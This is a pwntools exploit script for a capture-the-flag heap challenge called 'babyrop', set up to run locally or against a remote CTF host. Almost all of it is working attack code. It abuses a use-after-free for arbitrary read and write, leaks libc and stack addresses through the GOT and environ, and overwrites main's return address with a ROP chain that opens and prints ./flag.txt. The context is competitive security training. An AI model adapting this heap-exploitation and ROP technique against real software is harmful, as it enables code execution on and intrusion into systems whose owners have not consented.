from pwn import *
import struct

# ❯ patchelf --set-interpreter $PWD/ld-linux-x86-64.so.2 --set-rpath $PWD/libc.so.6 ./babyrop
# ❯ LD_PRELOAD=./libc.so.6 ./babyrop

context.arch = 'amd64'
context.terminal = ("terminator", "--new-tab", "-e")


binary = "./babyrop"
libc = "./libc.so.6"

elf = ELF(binary)
lib = ELF(libc)

env = {"LD_PRELOAD":libc}

if "remote" in sys.argv:
    sh = remote("mc.ax", 31245)
else :
    sh = process(binary, env=env)


if "debug" in sys.argv:
    gdb.attach(sh, gdbscript='''
    break *main+367
    continue
    ''')

def new_item(index, l, s):
    sh.recvuntil(b":")
    sh.sendline(b"C")
    sh.recvuntil(b":")
    sh.sendline("{}".format(index).encode())
    sh.recvuntil(b":")
    sh.sendline("{}".format(l).encode())
    sh.recvuntil(b":")
    sh.sendline(s)


def free_item(index):
    sh.recvuntil(b":")
    sh.sendline(b"F")
    sh.recvuntil(b":")
    sh.sendline("{}".format(index).encode())


def read_item(index, p=False):
    sh.recvuntil(b":")
    sh.sendline(b"R")
    sh.recvuntil(b":")
    sh.sendline("{}".format(index).encode())
    sh.recvline()
    out = sh.recvline()
    if p:
        print(f"Index {index}:", out)
    return b"".join(out.strip().split(b" ")[:7][::-1])


def write_item(index, s):
    sh.recvuntil(b":")
    sh.sendline(b"W")
    sh.recvuntil(b":")
    sh.sendline("{}".format(index).encode())
    sh.recvuntil(b":")
    sh.sendline(s)


# make new object in 2, struct stored in 0's old spot; read from 0
def arb_read(addr):
    new_item(2, 16, p64(16)+p64(addr))
    r = int(read_item(0), 16)
    free_item(2)
    return r

# make new object in 2, struct stored in 0's old spot; write to 0
def arb_write(addr, size, val):
    new_item(2, 16, p64(size)+p64(addr))
    write_item(0, p64(addr))
    write_item(0, val)
    free_item(2)


# read down stack until we find the matching ret from main
# hunter ftw
def get_return_addr_target(stack_addr, find):
    print(f"STCK Hunt:\t\t{hex(find)}")
    addr = (stack_addr & 0xfffffffffffffff0) - 0x200

    while addr < stack_addr:
        val = arb_read(addr)
        #print(hex(val))
        if (val) == find:
            return addr
        addr += 8

def dump_stack(stack_addr):
    addr = (stack_addr & 0xfffffffffffffff0) - 0x200

    while addr < stack_addr:
        val = arb_read(addr)
        print(hex(val))
        addr += 8

# tcache fuckery and UAF on object 0 setup
new_item(0, 32, b"A"*24)
new_item(1, 32, b"B"*24)

# create primitives
free_item(0)
free_item(1)

# leak and find useful addresses
libc_ret = 0x2d1ca
printf_leak = arb_read(elf.symbols['got.printf'])
libc_base = printf_leak - lib.symbols['printf']
env_ptr = libc_base + lib.symbols['environ']


stack_addr = arb_read(env_ptr)
ret_addr = get_return_addr_target(stack_addr, libc_base + libc_ret )

print(f"LIBC Base:\t\t{hex(libc_base)}")
print(f"STCK Addr:\t\t{hex(stack_addr)}")
print(f"MRet Addr:\t\t{hex(ret_addr)}")

# important! this is what adds the base to out ROP
lib.address = libc_base

# generated rop chain, add base after leak
strings_addr = env_ptr
rop = ROP(lib)
rop.read(0, strings_addr)
rop(rdi=strings_addr, rsi=0x000)
rop.raw(lib.symbols['open'])
rop.read(3, strings_addr, 100) # probs fd 3; educated guess
rop.puts(strings_addr)
rop(rdi=0)
rop.raw(lib.symbols['exit'])

print(rop.dump())
payload = rop.chain()

# write payload
arb_write(ret_addr, len(payload), payload)

# exit the main loop; ret to payload
sh.recvuntil(b":")
sh.sendline(b"E")
sh.recvuntil(b":")
sh.sendline(b"1")

# send flag string
sh.sendline(b"./flag.txt\x00")

# grab all output
print(sh.recvall())